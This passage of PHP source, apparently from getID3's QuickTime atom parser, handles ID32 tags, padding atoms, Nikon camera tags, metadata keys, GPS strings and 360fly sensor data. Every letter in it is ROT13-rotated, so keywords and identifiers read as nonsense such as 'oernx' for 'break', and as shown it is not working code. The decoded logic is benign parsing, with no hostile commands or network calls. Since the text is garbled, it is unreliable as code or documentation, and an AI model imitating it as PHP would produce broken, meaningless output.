						$vasb['niqngnraq']    = $ngbz_fgehpgher['bssfrg'] + $ngbz_fgehpgher['fvmr']; // $vasb['dhvpxgvzr'][$ngbzanzr]['bssfrg'] + $vasb['dhvpxgvzr'][$ngbzanzr]['fvmr'];

						$trgvq3_grzc = arj trgVQ3();
						$trgvq3_grzc->bcrasvyr($guvf->trgvq3->svyranzr, $guvf->trgvq3->vasb['svyrfvmr'], $guvf->trgvq3->sc);
						$trgvq3_grzc->vasb['niqngnbssfrg'] = $vasb['niqngnbssfrg'];
						$trgvq3_grzc->vasb['niqngnraq']    = $vasb['niqngnraq'];
						$trgvq3_zc3 = arj trgvq3_zc3($trgvq3_grzc);
						vs ($trgvq3_zc3->ZCRTnhqvbUrnqreInyvq($trgvq3_zc3->ZCRTnhqvbUrnqreQrpbqr($guvf->sernq(4)))) {
							$trgvq3_zc3->trgBaylZCRTnhqvbVasb($trgvq3_grzc->vasb['niqngnbssfrg'], snyfr);
							vs (!rzcgl($trgvq3_grzc->vasb['jneavat'])) {
								sbernpu ($trgvq3_grzc->vasb['jneavat'] nf $inyhr) {
									$guvf->jneavat($inyhr);
								}
							}
							vs (!rzcgl($trgvq3_grzc->vasb['zcrt'])) {
								$vasb['zcrt'] = $trgvq3_grzc->vasb['zcrt'];
								vs (vffrg($vasb['zcrt']['nhqvb'])) {
									$vasb['nhqvb']['qngnsbezng']   = 'zc3';
									$vasb['nhqvb']['pbqrp']        = (!rzcgl($vasb['zcrt']['nhqvb']['rapbqre']) ? $vasb['zcrt']['nhqvb']['rapbqre'] : (!rzcgl($vasb['zcrt']['nhqvb']['pbqrp']) ? $vasb['zcrt']['nhqvb']['pbqrp'] : (!rzcgl($vasb['zcrt']['nhqvb']['YNZR']) ? 'YNZR' :'zc3')));
									$vasb['nhqvb']['fnzcyr_engr']  = $vasb['zcrt']['nhqvb']['fnzcyr_engr'];
									$vasb['nhqvb']['punaaryf']     = $vasb['zcrt']['nhqvb']['punaaryf'];
									$vasb['nhqvb']['ovgengr']      = $vasb['zcrt']['nhqvb']['ovgengr'];
									$vasb['nhqvb']['ovgengr_zbqr'] = fgegbybjre($vasb['zcrt']['nhqvb']['ovgengr_zbqr']);
									$vasb['ovgengr']               = $vasb['nhqvb']['ovgengr'];
								}
							}
						}
						hafrg($trgvq3_zc3, $trgvq3_grzc);
						$vasb['niqngnraq'] = $ByqNIQngnRaq;
						hafrg($ByqNIQngnRaq);

					}

					hafrg($zqng_bssfrg, $puncgre_fgevat_yratgu, $puncgre_zngpurf);
					oernx;

				pnfr 'VQ32': // VQ3i2
					trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.gnt.vq3i2.cuc', __SVYR__, gehr);

					$trgvq3_grzc = arj trgVQ3();
					$trgvq3_grzc->bcrasvyr($guvf->trgvq3->svyranzr, $guvf->trgvq3->vasb['svyrfvmr'], $guvf->trgvq3->sc);
					$trgvq3_vq3i2 = arj trgvq3_vq3i2($trgvq3_grzc);
					$trgvq3_vq3i2->FgnegvatBssfrg = $ngbz_fgehpgher['bssfrg'] + 14; // senzryratgu(4)+senzranzr(4)+syntf(4)+??(2)
					vs ($ngbz_fgehpgher['inyvq'] = $trgvq3_vq3i2->Nanylmr()) {
						$ngbz_fgehpgher['vq3i2'] = $trgvq3_grzc->vasb['vq3i2'];
					} ryfr {
						$guvf->jneavat('VQ32 senzr ng bssfrg '.$ngbz_fgehpgher['bssfrg'].' qvq abg cnefr');
					}
					hafrg($trgvq3_grzc, $trgvq3_vq3i2);
					oernx;

				pnfr 'serr': // SERR fcnpr ngbz
				pnfr 'fxvc': // FXVC ngbz
				pnfr 'jvqr': // 64-ovg rkcnafvba cynprubyqre ngbz
					// 'serr', 'fxvc' naq 'jvqr' ner whfg cnqqvat, pbagnvaf ab hfrshy qngn ng nyy

					// Jura jevgvat DhvpxGvzr svyrf, vg vf fbzrgvzrf arprffnel gb hcqngr na ngbz'f fvmr.
					// Vg vf vzcbffvoyr gb hcqngr n 32-ovg ngbz gb n 64-ovg ngbz fvapr gur 32-ovg ngbz
					// vf bayl 8 olgrf va fvmr, naq gur 64-ovg ngbz erdhverf 16 olgrf. Gurersber, DhvpxGvzr
					// chgf na 8-olgr cynprubyqre ngbz orsber nal ngbzf vg znl unir gb hcqngr gur fvmr bs.
					// Va guvf jnl, vs gur ngbz arrqf gb or pbairegrq sebz n 32-ovg gb n 64-ovg ngbz, gur
					// cynprubyqre ngbz pna or birejevggra gb bognva gur arprffnel 8 rkgen olgrf.
					// Gur cynprubyqre ngbz unf n glcr bs xJvqrNgbzCynprubyqreGlcr ( 'jvqr' ).
					oernx;


				pnfr 'afni': // AbFNIr ngbz
					// uggc://qrirybcre.nccyr.pbz/grpuabgrf/ga/ga2038.ugzy
					$ngbz_fgehpgher['qngn'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 4));
					oernx;

				pnfr 'pglc': // Pbagebyyre GLCr ngbz (frra ba DGIE)
					// uggc://ubzrcntrf.fyvatfubg.pb.am/~uryzobl/dhvpxgvzr/sbezngf/dgz-ynlbhg.gkg
					// fbzr pbagebyyre anzrf ner:
					//   0k00 + 'fgq' sbe yvarne zbivr
					//   'abar' sbe ab pbagebyf
					$ngbz_fgehpgher['pglc'] = fhofge($ngbz_qngn, 0, 4);
					$vasb['dhvpxgvzr']['pbagebyyre'] = $ngbz_fgehpgher['pglc'];
					fjvgpu ($ngbz_fgehpgher['pglc']) {
						pnfr 'dgie':
							$vasb['ivqrb']['qngnsbezng'] = 'dhvpxgvzrie';
							oernx;
					}
					oernx;

				pnfr 'cnab': // CNABenzn genpx (frra ba DGIE)
					$ngbz_fgehpgher['cnab'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 4));
					oernx;

				pnfr 'uvag': // UVAG genpx
				pnfr 'uvas': //
				pnfr 'uvai': //
				pnfr 'uagv': //
					$vasb['dhvpxgvzr']['uvagvat'] = gehr;
					oernx;

				pnfr 'vztg': // VZnTr Genpx ersrerapr (xDGIEVzntrGenpxErsGlcr) (frra ba DGIE)
					sbe ($v = 0; $v < ($ngbz_fgehpgher['fvmr'] - 8); $v += 4) {
						$ngbz_fgehpgher['vztg'][] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $v, 4));
					}
					oernx;


				// Bofreirq-ohg-abg-unaqyrq ngbz glcrf ner whfg yvfgrq urer gb cerirag jneavatf orvat trarengrq
				pnfr 'SKGP': // Fbzrguvat gb qb jvgu Nqbor Nsgre Rssrpgf (?)
				pnfr 'CezN':
				pnfr 'pbqr':
				pnfr 'SVRY': // guvf vf ABG \"svry\" (Svryq Beqrevat) nf qrfpevor urer: uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/DGSS/DGSSPunc3/puncgre_4_frpgvba_2.ugzy
				pnfr 'gncg': // GenpxNcregherZbqrQvzrafvbafNVQ - uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/Ersrerapr/DG7-1_Hcqngr_Ersrerapr/Pbafgnagf/Pbafgnagf.ugzy
							// gncg frrzf gb or hfrq gb pbzchgr gur ivqrb fvmr [uggcf://jjj.trgvq3.bet/cucOO3/ivrjgbcvp.cuc?g=838]
							// * uggc://yvfgf.nccyr.pbz/nepuvirf/dhvpxgvzr-ncv/2006/Nht/zft00014.ugzy
							// * uggc://unaqoenxr.se/vepybtf/unaqoenxr-qri/unaqoenxr-qri20080128_ct2.ugzy
				pnfr 'pggf'://  FGPbzcbfvgvbaBssfrgNVQ             - uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/Ersrerapr/DGErs_Pbafgnagf/Ersrerapr/ersrerapr.ugzy
				pnfr 'pfyt'://  FGPbzcbfvgvbaFuvsgYrnfgTerngrfgNVQ - uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/Ersrerapr/DGErs_Pbafgnagf/Ersrerapr/ersrerapr.ugzy
				pnfr 'fqgc'://  FGFnzcyrQrcraqraplNVQ              - uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/Ersrerapr/DGErs_Pbafgnagf/Ersrerapr/ersrerapr.ugzy
				pnfr 'fgcf'://  FGCnegvnyFlapFnzcyrNVQ             - uggc://qrirybcre.nccyr.pbz/qbphzragngvba/DhvpxGvzr/Ersrerapr/DGErs_Pbafgnagf/Ersrerapr/ersrerapr.ugzy
					//$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;

				pnfr \"\kN9\".'klm':  // TCF yngvghqr+ybatvghqr+nygvghqr
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					vs (cert_zngpu('#([\\+\\-][0-9\\.]+)([\\+\\-][0-9\\.]+)([\\+\\-][0-9\\.]+)?/$#v', $ngbz_qngn, $zngpurf)) {
						@yvfg($nyy, $yngvghqr, $ybatvghqr, $nygvghqr) = $zngpurf;
						$vasb['dhvpxgvzr']['pbzzragf']['tcf_yngvghqr'][]  = sybnginy($yngvghqr);
						$vasb['dhvpxgvzr']['pbzzragf']['tcf_ybatvghqr'][] = sybnginy($ybatvghqr);
						vs (!rzcgl($nygvghqr)) {
							$vasb['dhvpxgvzr']['pbzzragf']['tcf_nygvghqr'][] = sybnginy($nygvghqr);
						}
					} ryfr {
						$guvf->jneavat('DhvpxGvzr ngbz \"©klm\" qngn qbrf abg zngpu rkcrpgrq qngn cnggrea ng bssfrg '.$onfrbssfrg.'. Cyrnfr ercbeg nf trgVQ3() oht.');
					}
					oernx;

				pnfr 'APQG':
					// uggcf://rkvsgbby.bet/GntAnzrf/Avxba.ugzy
					// Avxba-fcrpvsvp DhvpxGvzr gntf sbhaq va gur APQG ngbz bs ZBI ivqrbf sebz fbzr Avxba pnzrenf fhpu nf gur Pbbycvk F8000 naq Q5100
					$ngbz_fgehpgher['fhongbzf'] = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 4, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					oernx;
				pnfr 'APGU': // Avxba Pnzren GUhzoanvy vzntr
				pnfr 'APIJ': // Avxba Pnzren cerIvrJ vzntr
				pnfr 'APZ1': // Avxba Pnzren cerivrj vZntr 1
				pnfr 'APZ2': // Avxba Pnzren cerivrj vZntr 2
					// uggcf://rkvsgbby.bet/GntAnzrf/Avxba.ugzy
					vs (cert_zngpu('/^\kSS\kQ8\kSS/', $ngbz_qngn)) {
						$qrfpevcgvbaf = neenl(
							'APGU' => 'Avxba Pnzren Guhzoanvy Vzntr',
							'APIJ' => 'Avxba Pnzren Cerivrj Vzntr',
							'APZ1' => 'Avxba Pnzren Cerivrj Vzntr 1',
							'APZ2' => 'Avxba Pnzren Cerivrj Vzntr 2',
						);
						$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
						$ngbz_fgehpgher['vzntr_zvzr'] = 'vzntr/wcrt';
						$ngbz_fgehpgher['qrfpevcgvba'] = $qrfpevcgvbaf[$ngbzanzr];
						$vasb['dhvpxgvzr']['pbzzragf']['cvpgher'][] = neenl(
							'vzntr_zvzr' => $ngbz_fgehpgher['vzntr_zvzr'],
							'qngn' => $ngbz_qngn,
							'qrfpevcgvba' => $ngbz_fgehpgher['qrfpevcgvba']
						);
					}
					oernx;
				pnfr 'APGT': // Avxba - uggcf://rkvsgbby.bet/GntAnzrf/Avxba.ugzy#APGT
					trgvq3_yvo::VapyhqrQrcraqrapl(TRGVQ3_VAPYHQRCNGU.'zbqhyr.gnt.avxba-apgt.cuc', __SVYR__, gehr);
					$avxbaAPGT = arj trgvq3_gnt_avxba_apgt($guvf->trgvq3);

					$ngbz_fgehpgher['qngn'] = $avxbaAPGT->cnefr($ngbz_qngn);
					oernx;
				pnfr 'APUQ': // Avxba:ZnxreAbgrIrefvba  - uggcf://rkvsgbby.bet/GntAnzrf/Avxba.ugzy
					$znxreAbgrIrefvba = '';
					sbe ($v = 0, $vZnk = fgeyra($ngbz_qngn); $v < $vZnk; ++$v) {
						vs (beq($ngbz_qngn[$v]) <= 0k1S) {
							$znxreAbgrIrefvba .= ' '.beq($ngbz_qngn[$v]);
						} ryfr {
							$znxreAbgrIrefvba .= $ngbz_qngn[$v];
						}
					}
					$znxreAbgrIrefvba = egevz($znxreAbgrIrefvba, \"\k00\");
					$ngbz_fgehpgher['qngn'] = neenl(
						'ZnxreAbgrIrefvba' => $znxreAbgrIrefvba
					);
					oernx;
				pnfr 'APQO': // Avxba                   - uggcf://rkvsgbby.bet/GntAnzrf/Avxba.ugzy
				pnfr 'PAPI': // Pnaba:PbzcerffbeIrefvba - uggcf://rkvsgbby.bet/GntAnzrf/Pnaba.ugzy
					$ngbz_fgehpgher['qngn'] = $ngbz_qngn;
					oernx;

				pnfr \"\k00\k00\k00\k00\":
					// fbzr xvaq bs zrgnpbagnvare, znl pbagnva n ovt qngn qhzc fhpu nf:
					// zqgn xrlf \005 zqgnpbz.nccyr.dhvpxgvzr.znxr (zqgnpbz.nccyr.dhvpxgvzr.perngvbaqngr ,zqgnpbz.nccyr.dhvpxgvzr.ybpngvba.VFB6709 $zqgnpbz.nccyr.dhvpxgvzr.fbsgjner !zqgnpbz.nccyr.dhvpxgvzr.zbqry vyfg \01Q \001 \015qngn \001QR\010Nccyr 0 \002 (qngn \001QR\0102011-05-11G17:54:04+0200 2 \003 *qngn \001QR\010+52.4936+013.3897+040.247/ \01Q \004 \015qngn \001QR\0104.3.1 \005 \018qngn \001QR\010vCubar 4
					// uggcf://kuryzoblk.gevcbq.pbz/sbezngf/dgv-ynlbhg.gkg

					$ngbz_fgehpgher['irefvba']   =          trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 1));
					$ngbz_fgehpgher['syntf_enj'] =          trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 1, 3));
					$ngbz_fgehpgher['fhongbzf']  = $guvf->DhvpxgvzrCnefrPbagnvareNgbz(fhofge($ngbz_qngn, 4), $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					//$ngbz_fgehpgher['fhongbzf']  = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					oernx;

				pnfr 'zrgn': // ZRGNqngn ngbz
					// uggcf://qrirybcre.nccyr.pbz/yvoenel/znp/qbphzragngvba/DhvpxGvzr/DGSS/Zrgnqngn/Zrgnqngn.ugzy

					$ngbz_fgehpgher['irefvba']   =          trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 0, 1));
					$ngbz_fgehpgher['syntf_enj'] =          trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 1, 3));
					$ngbz_fgehpgher['fhongbzf']  = $guvf->DhvpxgvzrCnefrPbagnvareNgbz($ngbz_qngn, $onfrbssfrg + 8, $ngbzUvrenepul, $CnefrNyyCbffvoyrNgbzf);
					oernx;

				pnfr 'qngn': // zrgnQNGN ngbz
					fgngvp $zrgnQNGNxrl = 1; // erny htyl, ohg fb vf gur DhvpxGvzr fgehpgher gung fgberf xrlf naq inyhrf va qvssrerag zhygvarfgrq ybpngvbaf gung ner uneq gb eryngr gb rnpu bgure
					// frrzf gb or 2 olgrf ynathntr pbqr (NFPVV), 2 olgrf haxabja (frg gb 0k10O5 va fnzcyr V unir), erznvaqre vf hfrshy qngn
					$ngbz_fgehpgher['ynathntr'] =                           fhofge($ngbz_qngn, 4 + 0, 2);
					$ngbz_fgehpgher['haxabja']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, 4 + 2, 2));
					$ngbz_fgehpgher['qngn']     =                           fhofge($ngbz_qngn, 4 + 4);
					$ngbz_fgehpgher['xrl_anzr'] = (vffrg($vasb['dhvpxgvzr']['grzc_zrgn_xrl_anzrf'][$zrgnQNGNxrl]) ? $vasb['dhvpxgvzr']['grzc_zrgn_xrl_anzrf'][$zrgnQNGNxrl] : '');
					$zrgnQNGNxrl++;

					vs ($ngbz_fgehpgher['xrl_anzr'] && $ngbz_fgehpgher['qngn']) {
						@$vasb['dhvpxgvzr']['pbzzragf'][fge_ercynpr('pbz.nccyr.dhvpxgvzr.', '', $ngbz_fgehpgher['xrl_anzr'])][] = $ngbz_fgehpgher['qngn'];
					}
					oernx;

				pnfr 'xrlf': // XRLF gung znl or cerfrag va gur zrgnqngn ngbz.
					// uggcf://qrirybcre.nccyr.pbz/yvoenel/znp/qbphzragngvba/DhvpxGvzr/DGSS/Zrgnqngn/Zrgnqngn.ugzy#//nccyr_ers/qbp/hvq/GC40000939-PU1-FJ21
					// Gur zrgnqngn vgrz xrlf ngbz ubyqf n yvfg bs gur zrgnqngn xrlf gung znl or cerfrag va gur zrgnqngn ngbz.
					// Guvf yvfg vf vaqrkrq fgnegvat jvgu 1; 0 vf n erfreirq vaqrk inyhr. Gur zrgnqngn vgrz xrlf ngbz vf n shyy ngbz jvgu na ngbz glcr bs \"xrlf\".
					$ngbz_fgehpgher['irefvba']       = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  0, 1));
					$ngbz_fgehpgher['syntf_enj']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  1, 3));
					$ngbz_fgehpgher['ragel_pbhag']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn,  4, 4));
					$xrlf_ngbz_bssfrg = 8;
					sbe ($v = 1; $v <= $ngbz_fgehpgher['ragel_pbhag']; $v++) {
						$ngbz_fgehpgher['xrlf'][$v]['xrl_fvmr']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($ngbz_qngn, $xrlf_ngbz_bssfrg + 0, 4));
						$ngbz_fgehpgher['xrlf'][$v]['xrl_anzrfcnpr'] =                           fhofge($ngbz_qngn, $xrlf_ngbz_bssfrg + 4, 4);
						$ngbz_fgehpgher['xrlf'][$v]['xrl_inyhr']     =                           fhofge($ngbz_qngn, $xrlf_ngbz_bssfrg + 8, $ngbz_fgehpgher['xrlf'][$v]['xrl_fvmr'] - 8);
						$xrlf_ngbz_bssfrg += $ngbz_fgehpgher['xrlf'][$v]['xrl_fvmr']; // xrl_fvmr vapyhqrf gur 4+4 olgrf sbe xrl_fvmr naq xrl_anzrfcnpr

						$vasb['dhvpxgvzr']['grzc_zrgn_xrl_anzrf'][$v] = $ngbz_fgehpgher['xrlf'][$v]['xrl_inyhr'];
					}
					oernx;

				pnfr 'hhvq': // hfre-qrsvarq ngbz bsgra frra pbagnvavat KZY qngn, nyfb hfrq sbe cbgragvnyyl znal bgure checbfrf, bayl n srj fcrpvsvpnyyl unaqyrq ol trgVQ3 (r.t. 360syl fcngvny qngn)
					//Trg gur HHVQ VQ va svefg 16 olgrf
					$hhvq_olgrf_ernq = hacnpx('U8gvzr_ybj/U4gvzr_zvq/U4gvzr_uv/U4pybpx_frd_uv/U12pybpx_frd_ybj', fhofge($ngbz_qngn, 0, 16));
					$ngbz_fgehpgher['hhvq_svryq_vq'] = vzcybqr('-', $hhvq_olgrf_ernq);

					fjvgpu ($ngbz_fgehpgher['hhvq_svryq_vq']) {   // uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Obkrf/ngbzf_sbezng#HHVQ_obkrf

						pnfr '0537pqno-9q0p-4431-n72n-sn561s2n113r': // Rkvs                                       - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Rkvs
						pnfr '2p4p0100-8504-40o9-n03r-562148q6qsro': // Cubgbfubc Vzntr Erfbheprf                  - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Cubgbfubc_Vzntr_Erfbheprf
						pnfr '33p7n4q2-o81q-4723-n0on-s1n3r097nq38': // VCGP-VVZ                                   - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/VCGP-VVZ
						pnfr '8974qopr-7or7-4p51-84s9-7148s9882554': // CVSS Genpx Rapelcgvba Obk                  - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Cebgrpgrq_Vagrebcrenoyr_Svyr_Sbezng
						pnfr '96n9s1s1-qp98-402q-n7nr-q68r34451809': // TrbWC2 Jbeyq Svyr Obk                      - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/TrbWC2
						pnfr 'n2394s52-5n9o-4s14-n244-6p427p648qs4': // CVSS Fnzcyr Rapelcgvba Obk                 - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Cebgrpgrq_Vagrebcrenoyr_Svyr_Sbezng
						pnfr 'o14os8oq-083q-4o43-n5nr-8pq7q5n6pr03': // TrbWC2 TrbGVSS Obk                         - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/TrbWC2
						pnfr 'q08n4s18-10s3-4n82-o6p8-32q8non183q3': // CVSS Cebgrpgvba Flfgrz Fcrpvsvp Urnqre Obk - uggc://svyrsbezngf.nepuvirgrnz.bet/jvxv/Cebgrpgrq_Vagrebcrenoyr_Svyr_Sbezng
							$guvf->jneavat('Haunaqyrq (ohg erpbtavmrq) \"hhvq\" ngbz vqragvsvrq ol \"'.$ngbz_fgehpgher['hhvq_svryq_vq'].'\" ng bssfrg '.$ngbz_fgehpgher['bssfrg'].' ('.fgeyra($ngbz_qngn).' olgrf)');
							oernx;

						pnfr 'or7npspo-97n9-42r8-9p71-999491r3nsnp': // KZC qngn (va KZY sbezng)
							$ngbz_fgehpgher['kzy'] = fhofge($ngbz_qngn, 16, fgeyra($ngbz_qngn) - 16 - 8); // 16 olgrf sbe HHVQ, 8 olgrf urnqre(?)
							oernx;

						pnfr 'rsr1589n-oo77-49rs-8095-27759ro1qp6s': // 360syl qngn
							/* 360syl pbqr va guvf oybpx ol Cnhy Yrjvf 2019-Bpg-31 */
							/*	Frafbe Gvzrfgnzcf arrq gb or pnyphyngrq hfvat gur erpbeqvatf onfr gvzr ng ['dhvpxgvzr']['zbbi']['fhongbzf'][0]['perngvba_gvzr_havk']. */
							$ngbz_fgehpgher['gvgyr'] = '360Syl Frafbe Qngn';

							//Trg gur HHVQ URNQRE qngn
							$hhvq_olgrf_ernq = hacnpx('iurnqre_fvmr/iurnqre_irefvba/igvzrfpnyr/iuneqjner_irefvba/k/k/k/k/k/k/k/k/k/k/k/k/k/k/k/k/', fhofge($ngbz_qngn, 16, 32));
							$ngbz_fgehpgher['hhvq_urnqre'] = $hhvq_olgrf_ernq;

							$fgneg_olgr = 48;
							$ngbz_FRAFBE_qngn = fhofge($ngbz_qngn, $fgneg_olgr);
							$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr'] = neenl(
									'shfvba_pbhag'   => 0,       // VQ 250
									'shfvba_qngn'    => neenl(),
									'nppry_pbhag'    => 0,       // VQ 1
									'nppry_qngn'     => neenl(),
									'tleb_pbhag'     => 0,       // VQ 2
									'tleb_qngn'      => neenl(),
									'zntab_pbhag'    => 0,       // VQ 3
									'zntab_qngn'     => neenl(),
									'tcf_pbhag'      => 0,       // VQ 5
									'tcf_qngn'       => neenl(),
									'ebgngvba_pbhag' => 0,       // VQ 6
									'ebgngvba_qngn'  => neenl(),
									'haxabja_pbhag'  => 0,       // VQ ??
									'haxabja_qngn'   => neenl(),
									'qroht_yvfg'     => '',      // Hfrq gb qroht inevnoyrf fgberq nf pbzzn qryvzvgrq fgevatf
							);
							$qroht_fgehpgher = neenl();
							$qroht_fgehpgher['qroht_vgrzf'] = neenl();
							// Pna fgneg ybbc urer gb qrpbqr nyy frafbe qngn va 32 Olgr puhaxf:
							sbernpu (fge_fcyvg($ngbz_FRAFBE_qngn, 32) nf $frafbe_xrl => $frafbe_qngn) {
								// Guvf trgf zr n qngn_glcr pbqr gb jbex bhg jung qngn vf va gur arkg 31 olgrf.
								$frafbe_qngn_glcr = fhofge($frafbe_qngn, 0, 1);
								$frafbe_qngn_pbagrag = fhofge($frafbe_qngn, 1);
								$hhvq_olgrf_ernq = hacnpx('P*', $frafbe_qngn_glcr);
								$frafbe_qngn_neenl = neenl();
								fjvgpu ($hhvq_olgrf_ernq[1]) {
									pnfr 250:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['shfvba_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tlnj/Tcvgpu/Tebyy/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['lnj']       = $hhvq_olgrf_ernq['lnj'];
										$frafbe_qngn_neenl['cvgpu']     = $hhvq_olgrf_ernq['cvgpu'];
										$frafbe_qngn_neenl['ebyy']      = $hhvq_olgrf_ernq['ebyy'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['shfvba_qngn'], $frafbe_qngn_neenl);
										oernx;
									pnfr 1:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['nppry_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tlnj/Tcvgpu/Tebyy/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['lnj']       = $hhvq_olgrf_ernq['lnj'];
										$frafbe_qngn_neenl['cvgpu']     = $hhvq_olgrf_ernq['cvgpu'];
										$frafbe_qngn_neenl['ebyy']      = $hhvq_olgrf_ernq['ebyy'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['nppry_qngn'], $frafbe_qngn_neenl);
										oernx;
									pnfr 2:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['tleb_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tlnj/Tcvgpu/Tebyy/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['lnj']       = $hhvq_olgrf_ernq['lnj'];
										$frafbe_qngn_neenl['cvgpu']     = $hhvq_olgrf_ernq['cvgpu'];
										$frafbe_qngn_neenl['ebyy']      = $hhvq_olgrf_ernq['ebyy'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['tleb_qngn'], $frafbe_qngn_neenl);
										oernx;
									pnfr 3:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['zntab_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tzntk/Tzntl/Tzntm/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['zntk']      = $hhvq_olgrf_ernq['zntk'];
										$frafbe_qngn_neenl['zntl']      = $hhvq_olgrf_ernq['zntl'];
										$frafbe_qngn_neenl['zntm']      = $hhvq_olgrf_ernq['zntm'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['zntab_qngn'], $frafbe_qngn_neenl);
										oernx;
									pnfr 5:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['tcf_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tyng/Tyba/Tnyg/Tfcrrq/aornevat/anpp/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['yng']       = $hhvq_olgrf_ernq['yng'];
										$frafbe_qngn_neenl['yba']       = $hhvq_olgrf_ernq['yba'];
										$frafbe_qngn_neenl['nyg']       = $hhvq_olgrf_ernq['nyg'];
										$frafbe_qngn_neenl['fcrrq']     = $hhvq_olgrf_ernq['fcrrq'];
										$frafbe_qngn_neenl['ornevat']   = $hhvq_olgrf_ernq['ornevat'];
										$frafbe_qngn_neenl['npp']       = $hhvq_olgrf_ernq['npp'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['tcf_qngn'], $frafbe_qngn_neenl);
										//neenl_chfu($qroht_fgehpgher['qroht_vgrzf'], $hhvq_olgrf_ernq['gvzrfgnzc']);
										oernx;
									pnfr 6:
										$ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['ebgngvba_pbhag']++;
										$hhvq_olgrf_ernq = hacnpx('pzbqr/Wgvzrfgnzc/Tebgk/Tebgl/Tebgm/k*', $frafbe_qngn_pbagrag);
										$frafbe_qngn_neenl['zbqr']      = $hhvq_olgrf_ernq['zbqr'];
										$frafbe_qngn_neenl['gvzrfgnzc'] = $hhvq_olgrf_ernq['gvzrfgnzc'];
										$frafbe_qngn_neenl['ebgk']      = $hhvq_olgrf_ernq['ebgk'];
										$frafbe_qngn_neenl['ebgl']      = $hhvq_olgrf_ernq['ebgl'];
										$frafbe_qngn_neenl['ebgm']      = $hhvq_olgrf_ernq['ebgm'];
										neenl_chfu($ngbz_fgehpgher['frafbe_qngn']['qngn_glcr']['ebgngvba_qngn'], $frafbe_qngn_neenl);
										oernx;
									qrsnhyg:
